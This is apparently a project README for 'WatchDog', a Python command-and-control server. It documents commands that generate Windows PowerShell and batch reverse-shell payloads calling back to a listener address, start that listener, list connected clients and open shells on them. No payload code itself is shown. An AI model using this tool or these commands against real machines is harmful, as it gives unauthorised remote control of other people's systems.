# WatchDog
WatchDog is a simple Python-based command and control (C2) server that allows you to manage and interact with multiple clients remotely. It provides a basic shell interface for executing commands on connected clients, checking their status, and generating payload scripts for reverse shell connections.

# Features
Multi-client Support:      WatchDog can handle multiple client connections simultaneously.
Payload Generation:        Generate payload scripts for various platforms and network configurations.
Client Status Monitoring:  Keep track of connected clients and receive notifications when clients disconnect.
Basic Shell Interface:     Interact with connected clients using a shell-like interface.

# Installation
```python
git clone https://github.com/your-username/WatchDog.git
cd WatchDog
python WatchDog.py
```

# Usage
WatchDog uses a simple command-line interface to manage various functionalities. Here are some key commands:

generate
Generate a payload for a reverse shell connection.
```python
generate payload=<payload_type> lhost=<local_host> lport=<local_port>
```

server
Configure the server settings and start listening for incoming connections.
```python
server rhost=<remote_host> rport=<remote_port> listening=<true/false>
```

# sessions
List all currently connected clients.

# shell <client_number>
Open a shell interface to interact with a specific connected client.

# help
Display help information with examples of command usage.

# Example Usage
Generate a payload for a Windows PowerShell reverse TCP connection:
```python
generate payload=windows/powershell/reverse_tcp lhost=192.168.10.1 lport=5050
generate payload=windows/powershell/reverse_tcp lport=5050
generate payload=windows/batch/reverse_tcp lhost=192.168.10.1 lport=5050
generate payload=windows/batch/reverse_tcp lport=5050
```

Start the server and listen for incoming connections:
```python
server rhost=192.168.10.1 rport=5050 listening=true
server rport=5050 listening=true
```

View the list of connected clients:
```python
sessions
```

Interact with a specific client:
```python
shell 0
```


# Disclaimer
This project is for educational purposes only. The use of WatchDog for any malicious activity is strictly prohibited. The authors are not responsible for any misuse or damage caused by this software.

# Contributing
Feel free to contribute to the development of WatchDog by submitting issues or pull requests. Your feedback and contributions are highly appreciated.
